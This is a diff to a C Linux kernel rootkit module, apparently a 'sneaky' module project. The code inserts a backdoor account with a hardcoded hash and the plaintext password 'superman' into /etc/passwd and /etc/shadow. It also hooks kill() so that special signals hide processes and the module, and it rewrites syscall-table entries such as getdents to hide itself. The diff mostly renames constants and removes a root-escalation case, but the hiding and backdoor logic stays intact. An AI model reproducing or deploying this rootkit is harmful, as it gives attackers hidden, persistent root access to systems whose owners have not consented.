@@ -26,11 +26,14 @@
 
 #define BACKDOOR_SHADOW "user1:$1$MvZ75uo5$a2pTPgyDXrO6n.eyQjcmq0:16888:0:99999:7:::\n" // password is superman
 
-#define PASSWD_FILE "/etc/passwd"
+#define PASSWD "/etc/passwd"
 #define PASSWD_COPY "/tmp/passwd"
-#define SHADOW_FILE "/etc/shadow"
+#define SHADOW "/etc/shadow"
 #define SHADOW_COPY "/tmp/shadow"
 #define MAGIC_NUMBER 12345
+#define	SIGSHPROC 62
+#define SIGSHMOD 63
+
 struct linux_dirent {
   u64 d_ino;
   s64 d_off;
@@ -38,11 +41,6 @@ struct linux_dirent {
   char d_name[BUFFLEN];
 };
 
-enum {
-	SIGSHPROC = 62,
-	SIGSUPER = 64,
-	SIGSHMOD = 63,
-};
 
 unsigned long* GetSysTable(void){
 	unsigned long *sys_call_table;
@@ -196,25 +194,21 @@ void HideModule(void){
 asmlinkage int (*original_kill)(pid_t pid, int sig);
 asmlinkage int sneaky_kill(pid_t pid, int sig){
 	struct task_struct* curp = current;
-	switch(sig){
-		case SIGSHPROC: 
-		    for_each_process(curp){
-        		if(curp->pid == pid){
-					curp->flags = curp->flags ^ PF_INVISIBLE;
-					break;
-				}
-    		}
-			return -ESRCH;
-			break;
-		case SIGSUPER:
-			GetRoot();
-			break;
-		case SIGSHMOD:
-			if(mhide) ShowModule();
-			else HideModule();
-			break;
-		default:
-			return original_kill(pid, sig);
+	if(sig == SIGSHPROC){ 
+		for_each_process(curp){
+        	if(curp->pid == pid){
+				curp->flags = curp->flags ^ PF_INVISIBLE;
+				break;
+			}
+    	}
+		return -ESRCH;
+	}
+	else if(sig == SIGSHMOD){
+		if(mhide) ShowModule();
+		else HideModule();
+	}
+	else{
+		return original_kill(pid, sig);
 	}
 	return 0;
 }
@@ -318,11 +312,11 @@ void add_backdoor(char * pathname)
   struct file *file;
 
   printk(KERN_ALERT "hello add backdoor\n");
-  if(strcmp(pathname, PASSWD_FILE)==0){
+  if(strcmp(pathname, PASSWD)==0){
     BACKDOOR = BACKDOOR_PASSWD;
     cp_passwd(pathname, PASSWD_COPY);
   }
- 	if(strcmp(pathname, SHADOW_FILE)==0){
+ 	if(strcmp(pathname, SHADOW)==0){
     BACKDOOR = BACKDOOR_SHADOW;
     cp_passwd(pathname, SHADOW_COPY);
  	}
@@ -445,8 +439,8 @@ static int initialize_sneaky_module(void)
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
   */
-  add_backdoor(PASSWD_FILE);
-  add_backdoor(SHADOW_FILE);
+  add_backdoor(PASSWD);
+  add_backdoor(SHADOW);
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
@@ -495,8 +489,8 @@ static void exit_sneaky_module(void)
   pages_rw(page_ptr, 1);
   */
   //restore passwd and shadow file
-  restore_passwd(PASSWD_COPY, PASSWD_FILE);
-  restore_passwd(SHADOW_COPY, SHADOW_FILE);
+  restore_passwd(PASSWD_COPY, PASSWD);
+  restore_passwd(SHADOW_COPY, SHADOW);
   //This is more magic! Restore the original 'open' system call
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
